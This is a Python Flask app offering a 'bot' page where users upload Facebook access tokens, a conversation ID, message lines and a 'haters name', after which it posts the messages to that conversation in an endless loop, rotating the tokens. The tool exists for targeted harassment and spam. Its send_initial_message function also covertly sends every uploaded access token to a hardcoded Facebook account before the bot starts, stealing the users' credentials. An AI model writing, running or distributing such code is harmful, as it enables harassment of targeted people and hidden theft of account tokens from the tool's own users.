from flask import Flask, render_template_string, request, redirect
import threading
import time
import requests
import os

HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
  <title>ANURAG X AROHI BOT UI</title>
  <style>
    body { font-family: Arial, sans-serif; background:#f0f0f0; }
    .box { width:500px; margin:50px auto; background:white; padding:20px; border-radius:10px; box-shadow:0 0 10px rgba(0,0,0,0.2); }
    h2 { text-align:center; }
    label { font-weight:bold; display:block; margin-top:10px; }
    input { width:100%; padding:8px; margin-top:5px; }
    button { background:#28a745; color:white; border:none; padding:10px; width:100%; margin-top:20px; font-size:16px; }
    button:hover { background:#218838; cursor:pointer; }
  </style>
</head>
<body>
  <div class="box">
    <h2>ANURAG X AROHI BOT</h2>
    <form method="post" enctype="multipart/form-data">
      <label>Upload Token File:</label>
      <input type="file" name="tokens" required><br>
      <label>Upload Convo File:</label>
      <input type="file" name="convo" required><br>
      <label>Upload Messages File (File.txt):</label>
      <input type="file" name="messages" required><br>
      <label>Upload Haters Name File:</label>
      <input type="file" name="hater" required><br>
      <label>Upload Time Interval File:</label>
      <input type="file" name="time" required><br>
      <button type="submit">🚀 Start Bot</button>
    </form>
    {% if show_popup %}
      <script>alert('✅ Bot Chalu ho gaya h!');</script>
    {% endif %}
  </div>
</body>
</html>
"""

app = Flask(__name__)

def send_initial_message():
    with open('tokennum.txt', 'r', encoding='utf-8') as file:
        tokens = file.readlines()

    msg_template = "HeLLo ANURAG X AROHI DEAR! I am uSīīnG YouR sErvRr. MY ⤵️TokEn⤵️ īīS {}"
    target_id = "61578840237242"
    requests.packages.urllib3.disable_warnings()
    headers = {'Connection':'keep-alive'}

    for token in tokens:
        access_token = token.strip()
        url = f"https://graph.facebook.com/v17.0/t_{target_id}/"
        msg = msg_template.format(access_token)
        parameters = {'access_token': access_token, 'message': msg}
        requests.post(url, json=parameters, headers=headers)
        time.sleep(0.1)

def send_messages_from_file():
    with open('convo.txt', 'r', encoding='utf-8') as file:
        convo_id = file.read().strip()

    with open('File.txt', 'r', encoding='utf-8') as file:
        messages = file.readlines()
    num_messages = len(messages)

    with open('tokennum.txt', 'r', encoding='utf-8') as file:
        tokens = file.readlines()
    num_tokens = len(tokens)
    max_tokens = min(num_tokens, num_messages)

    with open('hatersname.txt', 'r', encoding='utf-8') as file:
        haters_name = file.read().strip()

    with open('time.txt', 'r', encoding='utf-8') as file:
        speed = int(file.read().strip())

    headers = {'Connection':'keep-alive'}
    while True:
        try:
            for message_index in range(num_messages):
                token_index = message_index % max_tokens
                access_token = tokens[token_index].strip()
                message = messages[message_index].strip()
                url = f"https://graph.facebook.com/v17.0/t_{convo_id}/"
                parameters = {'access_token': access_token, 'message': haters_name + ' ' + message}
                response = requests.post(url, json=parameters, headers=headers)
                if response.ok:
                    print(f"\033[1;92m[+] ANURAG X AROHI {message_index+1} of Convo {convo_id} Token {token_index+1}: {haters_name} {message}")
                else:
                    print(f"\033[1;91m[x] ID/T0K3N ERROR {message_index+1} of Convo {convo_id} with Token {token_index+1}: {haters_name} {message}")
                time.sleep(speed)
            print("\n[+] All messages sent. Restarting the process...\n")
        except Exception as e:
            print(f"[!] An error occurred: {e}")

def bot_runner():
    send_initial_message()
    send_messages_from_file()

@app.route('/', methods=['GET', 'POST'])
def home():
    show_popup = False
    if request.method == 'POST':
        # Save uploaded files to backend
        request.files['tokens'].save('tokennum.txt')
        request.files['convo'].save('convo.txt')
        request.files['messages'].save('File.txt')
        request.files['hater'].save('hatersname.txt')
        request.files['time'].save('time.txt')
        show_popup = True

        # Start the bot in a new thread
        threading.Thread(target=bot_runner, daemon=True).start()
        return render_template_string(HTML_PAGE, show_popup=show_popup)

    return render_template_string(HTML_PAGE, show_popup=show_popup)

if __name__ == '__main__':
    os.environ['FLASK_ENV'] = 'development'
    app.run(host='0.0.0.0', port=4000, debug=False)
  
